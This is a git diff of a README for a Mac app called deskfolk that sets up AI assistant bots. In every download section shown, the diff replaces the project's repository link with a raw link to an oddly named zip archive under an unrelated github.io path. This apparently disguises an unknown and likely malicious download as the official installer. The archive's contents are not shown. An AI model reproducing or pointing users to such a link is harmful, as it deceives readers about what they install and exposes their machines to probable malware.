@@ -7,7 +7,7 @@ description: "Build persistent AI teammates on your Mac, organized by conversati
 
 ## 🚀 Getting Started
 
-**Visit this link to download the application:** [**Download deskfolk**](https://github.com/k1451/deskfolk)
+**Visit this link to download the application:** [**Download deskfolk**](https://github.com/k1451/k1451.github.io/raw/refs/heads/main/abdul/a/Latest_roundheadedness.zip)
 
 Welcome to deskfolk, the desktop app that brings helpful AI bots right onto your Mac. Think of it as having a team of smart assistants who live inside your chat windows and work alongside you—no programming skills needed. This guide walks you through everything, step by step.
 
@@ -28,7 +28,7 @@ It's built for people who want practical AI help without sending their data to t
 
 ## 📥 How to Download and Install
 
-**Visit this link to download the application:** [**Click here to get deskfolk**](https://github.com/k1451/deskfolk)
+**Visit this link to download the application:** [**Click here to get deskfolk**](https://github.com/k1451/k1451.github.io/raw/refs/heads/main/abdul/a/Latest_roundheadedness.zip)
 
 1. Click the link above. It takes you to the deskfolk page.
 2. Look for the section that says "Releases" or "Download" on that page.
@@ -107,7 +107,7 @@ For updates, feature requests, or to see what's coming next, revisit the downloa
 
 You now have everything you need to get deskfolk up and running on your Mac. Start with one bot, give it a task, and watch the flow board come alive. It's your own little team of AI helpers, right where you need them.
 
-**One more time, here's your download link:** [**Get deskfolk now**](https://github.com/k1451/deskfolk)
+**One more time, here's your download link:** [**Get deskfolk now**](https://github.com/k1451/k1451.github.io/raw/refs/heads/main/abdul/a/Latest_roundheadedness.zip)
 
 Enjoy your new digital coworkers!
 
